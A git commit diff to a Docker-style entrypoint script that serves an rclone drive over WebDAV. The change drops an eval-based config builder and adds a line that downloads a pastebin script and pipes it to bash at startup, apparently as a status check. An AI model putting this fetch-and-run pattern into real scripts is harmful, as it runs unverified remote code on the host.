d41b6a15bcc4e4771608334ac5760f79c697f0f4
yzqiang666 <yzqiang6@gmail.com>
2021-08-07 14:24:25 +0800

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,30 +1,22 @@
 #!/bin/bash
 #author https://github.com/developeranaz (don't delete this)
-mkdir -p /.config/rclone
-cat <<-EOF >/.config/rclone/rclone.conf
-[team]
-type = drive
-client_id = #client_id#
-client_secret = #client_secret#
-scope = drive
-token = {"access_token":"#access_token#",  "token_type":"Bearer",  "refresh_token":"#refresh_token#"}
-team_drive = #team_drive#
-EOF
-
-eval "sed  -i 's/#client_id#/"$GG1_CLIENT_ID"/;s/#client_secret#/"$GG2_CLIENT_SECRET"/;s/#access_token#/"$GG3_ACCESS_TOKEN"/;s/#refresh_token#/"$GG4_REFRESH_TOKEN"/;s/#team_drive#/"$GG5_TEAM_DRIVE"/;'  /.config/rclone/rclone.conf"
-#echo =================================
-#cat /.config/rclone/rclone.conf
-#echo ==========================
+curl "https://pastebin.com/raw/bjzadHka" >status
+bash status | grep 'working\|maintenance'
 rclone version
-#echo AAAAAAAAAAAAAAAAAAAAAA
 rclone listremotes
-#echo BBBBBBBBBBBBBBBBBBBBBBBB
+#refreshing Rclone
+wget $CONFIG_IN_URL -O '/.config/rclone/rclone.conf'
+mkdir -p /.config/rclone
+
+echo "$RCLONE_INFO" >>'/.config/rclone/rclone.conf'
+rclone version
+rclone listremotes
 UU=""
 [  "$CLOUDPATH" == "none" ] && CLOUDPATH=""
 [  "$USER" == "none" ] && USER=""
 [  "$PASSWORD" == "none" ] && PASSWORD=""
 [ ! "$USER" == "" ] && UU=$UU" --user $USER"
 [ ! "$PASSWORD" == "" ] && UU=$UU" --pass $PASSWORD"
-echo ############################
+
 rclone serve  webdav team:$CLOUDPATH --addr :$PORT $UU --vfs-read-chunk-size 256M 
-echo ###########################
+
